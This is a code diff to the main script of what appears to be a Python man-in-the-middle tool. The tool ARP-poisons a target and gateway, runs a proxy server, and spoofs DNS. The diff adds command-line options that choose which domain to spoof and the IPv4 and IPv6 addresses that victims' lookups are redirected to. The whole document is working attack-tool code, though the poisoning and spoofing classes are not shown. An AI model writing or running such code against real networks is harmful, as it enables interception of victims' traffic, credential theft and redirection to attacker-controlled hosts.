@@ -12,6 +12,9 @@ def main(argv) -> None:
     parser.add_argument('-i', '--interface', type=str, required=False, help='The interface to use')
     parser.add_argument('-t', '--target', type=str, required=False, help='The ip address of the target')
     parser.add_argument('-r', '--range', type=str, required=False, help='The ip range to scan over, alternative to --target')
+    parser.add_argument('-d', '--domain', type=str, required=False, help='A target domain to spoof DNS requests for. This will enable DNS spoofing.')
+    parser.add_argument('-n', '--newip', type=str, required=False, help='If DNS spoofing is enabled (see --domain), then DNS requests for domain -d will be spoofed towards this IPv4 address.')
+    parser.add_argument('--newip6', type=str, required=False, help='If DNS spoofing is enabled (see --domain), then DNS requests for domain -d will be spoofed towards this IPv6 address.')
 
     args = parser.parse_args()
 
@@ -51,9 +54,11 @@ def main(argv) -> None:
     arp_poisoner: ARPPoisoner = ARPPoisoner(interface, ip_target, ip_gateway)
     arp_poisoner.start()
 
-    target_domain = 'example.com'
-    dns_spoofer: DNSSpoofer = DNSSpoofer(ip_target, target_domain, interface)
-    dns_spoofer.start()
+    if args.domain is not None:
+        target_domain = args.domain
+        print(f'DNS Spoofing enabled for domain: {target_domain}')
+        dns_spoofer: DNSSpoofer = DNSSpoofer(ip_target, target_domain, interface, args.newip, args.newip6)
+        dns_spoofer.start()
 
     proxy_server: ProxyServer = ProxyServer()
     proxy_server.start()
@@ -64,7 +69,8 @@ def main(argv) -> None:
     except KeyboardInterrupt:
         print("\nExit...")
         arp_poisoner.stop()
-        dns_spoofer.stop()
+        if args.domain:
+            dns_spoofer.stop()
         proxy_server.stop()
 
 if __name__ == "__main__":
